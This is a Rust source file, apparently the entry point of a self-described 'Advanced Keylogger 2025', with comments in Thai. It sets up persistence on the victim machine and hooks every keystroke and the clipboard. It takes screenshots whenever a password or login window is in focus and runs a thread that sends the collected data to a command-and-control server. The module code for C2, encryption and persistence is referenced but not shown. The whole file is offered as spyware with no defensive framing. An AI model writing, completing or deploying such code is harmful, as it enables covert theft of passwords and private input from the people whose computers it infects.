// keylogger.rs - Advanced Keylogger 2025 (Rust)
// บันทึกคีย์ + ชื่อหน้าต่างแอป + ส่งไป C2 แบบเข้ารหัส

mod config;
mod crypto;
mod logger;
mod key_handler;
mod c2;
mod persistence;
mod clipboard;
mod screenshot;
mod window;

use rdev::{listen, Event};
use std::sync::Arc;
use std::thread;
use tokio;

fn main() {
    persistence::setup_persistence();

    let logger = Arc::new(logger::Logger::new());
    let key_state = Arc::new(std::sync::Mutex::new(key_handler::KeyState::new()));

    // Thread สำหรับส่งข้อมูลไป C2
    {
        let logger_clone = Arc::clone(&logger);
        thread::spawn(move || {
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(c2::c2_sender(logger_clone));
        });
    }

    // Thread สำหรับ monitor clipboard
    {
        let logger_clone = Arc::clone(&logger);
        thread::spawn(move || {
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(clipboard::clipboard_monitor(logger_clone));
        });
    }

    // Callback หลักสำหรับดักคีย์
    let callback = move |event: Event| {
        key_handler::handle_key_event(event.event_type, &key_state, &logger);

        // Take screenshot if in password/login window
        if let Some(path) = screenshot::take_screenshot_if_password() {
            logger.log_screenshot(path);
        }
    };

    // เริ่มดักคีย์
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error);
    }
}